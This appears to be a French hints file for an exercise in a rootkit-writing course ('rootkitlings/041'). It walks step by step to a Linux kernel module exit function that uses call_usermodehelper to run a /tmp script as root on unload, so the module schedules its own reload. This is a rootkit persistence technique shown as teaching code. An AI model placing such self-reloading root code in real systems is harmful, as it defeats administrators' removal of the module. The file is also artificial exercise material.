# Hints, exercice 041

## Niveau 1

Tu dois definir deux tableaux: argv et envp.
argv contient le programme et ses arguments.
envp contient les variables d'environnement.
Les deux se terminent par NULL.

## Niveau 2

```c
char *argv[] = {"/bin/bash", "/tmp/reload.sh", NULL};
char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
```

Ensuite appelle call_usermodehelper avec ces tableaux.

## Niveau 3

```c
static void __exit reload_exit(void)
{
    char *argv[] = {"/bin/bash", "/tmp/reload.sh", NULL};
    char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

    call_usermodehelper("/bin/bash", argv, envp, UMH_NO_WAIT);

    pr_info("rootkitlings/041: module unloading, scheduling reload\n");
}
```
